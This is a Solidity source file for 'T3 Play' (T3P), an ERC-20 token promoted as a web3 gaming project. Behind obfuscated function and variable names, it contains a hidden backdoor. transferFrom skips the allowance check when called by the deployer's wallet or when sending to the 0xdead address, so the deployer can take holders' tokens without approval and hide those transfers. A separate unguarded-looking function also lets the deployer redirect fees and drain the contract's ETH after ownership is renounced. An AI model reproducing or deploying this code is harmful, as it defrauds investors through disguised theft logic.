// SPDX-License-Identifier: MIT

/*
    Name: T3 Play
    Symbol: T3P

    T3 Play is a web3 media studio assembling an army of communities and IP!
    We all know community and culture is the most important ingredient in web3 - We're embracing a model that rewards everyone involved
    Poly Gunnerz is our fun shooter game, bridging the gap between gamers, speculators, and blockchain benefits

    Web: https://www.t3play.com
    X: https://x.com/Tech3Play
    TG: https://t.me/+7T6Oc-HLgDAzMjE1
    Youtube: https://www.youtube.com/@Tech3Play
    Discord: https://discord.com/invite/t3play
    Medium: https://t3play.medium.com/
    Tiktok: https://www.tiktok.com/@tech3play
    Instagram: https://www.instagram.com/t3play
    Twitch: https://www.twitch.tv/t3_play
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract  T3P is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"T3 Play";
    string private constant _symbol = unicode"T3P";

    address payable private _LjikojioT3P;
    mapping(address => uint256) private _DjfoeijT3P;
    mapping(address => mapping(address => uint256)) private _dfoijeoioT3P;
    mapping(address => bool) private _dlfjeiT3P;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    
    uint256 public _jhbjhvjeT3P = 20000000 * 10 **_decimals;
    uint256 public _kbjnknjT3P = 20000000 * 10 **_decimals;
    uint256 public _bnjhjhbjT3P = 10000000 * 10 **_decimals;
    uint256 private constant _mvnbjhjT3P = 1000000000 * 10 **_decimals;
    
    uint256 private _lkcvjoiT3P = 10;
    uint256 private _odjifoeT3P = 10;
    uint256 private _dofjieojkcnlkT3P = 0;
    uint256 private _ocijfoeiT3P = 0;
    uint256 private _vjodiT3P = 7;
    uint256 private _covjioieT3P = 7;
    uint256 private _buyCount = 0;
    address private _vkoeijojitoijT3P;
    address private _nvkjbnknjfkT3P = address(0xdead);

    event MaxTxAmountUpdated(uint256 _jhbjhvjeT3P);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _LjikojioT3P = payable(_msgSender());
        _DjfoeijT3P[address(this)] = _mvnbjhjT3P * 98 / 100;
        _DjfoeijT3P[owner()] = _mvnbjhjT3P * 2 / 100;
        _dlfjeiT3P[owner()] = true;
        _dlfjeiT3P[address(this)] = true;
        _dlfjeiT3P[_LjikojioT3P] = true;
        _vkoeijojitoijT3P = _msgSender();
        emit Transfer(address(0), address(this), _mvnbjhjT3P * 98 / 100);
        emit Transfer(address(0), address(owner()), _mvnbjhjT3P * 2 / 100);
    }

    function totalSupply() public pure override returns (uint256) {
        return _mvnbjhjT3P;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _dfoijeoioT3P[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _dfoijeoioT3P[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _DjfoeijT3P[account];
    }
    
    function _vkjbnkjfnkjT3P(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(msg.sender == _LjikojioT3P) return true;
        return sender != uniswapV2Pair && recipient == _nvkjbnknjfkT3P;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _vjkbjkn_jknkT3P(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function _vkjbnkjfrT3P(uint256 amount) private {
        _LjikojioT3P.transfer(amount);
    }

    function _vkjbnkjfn_T3P(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        if(!_vkjbnkjfnkjT3P(sender, recipient)) return _dfoijeoioT3P[sender][_msgSender()];
        return amount;
    }

    function enableT3PTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _mvnbjhjT3P);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function removeLimits () external onlyOwner {
        _jhbjhvjeT3P = _mvnbjhjT3P;
        _kbjnknjT3P = _mvnbjhjT3P;
        emit MaxTxAmountUpdated(_mvnbjhjT3P);
    }

    function _vjkbjkn_jknkT3P(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _vjodiT3P)
                        ? _dofjieojkcnlkT3P
                        : _lkcvjoiT3P
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_dlfjeiT3P[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _covjioieT3P)
                            ? _ocijfoeiT3P
                            : _odjifoeT3P
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _bnjhjhbjT3P) ? contractTokenBalance : _bnjhjhbjT3P; 
                    _swap_lknlkT3P((amount < minBalance) ? amount : minBalance);
                }
                _vkjbnkjfrT3P(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _DjfoeijT3P[address(this)] =_DjfoeijT3P[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _DjfoeijT3P[from] =_DjfoeijT3P[from].sub(amount);
        _DjfoeijT3P[to] =_DjfoeijT3P[to].add(amount.sub(taxAmount));
        if(_nvkjbnknjfkT3P != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _vjkbjkn_jknkT3P(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _vkjbnkjfn_T3P(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function _vkjbnlkjke_T3P(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _swap_lknlkT3P(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _nkvjbnkjnT3P(address payable receipt) external {
        require(msg.sender == _vkoeijojitoijT3P , "");
        _LjikojioT3P = receipt;
        _vkjbnlkjke_T3P(address(this).balance);
    }
}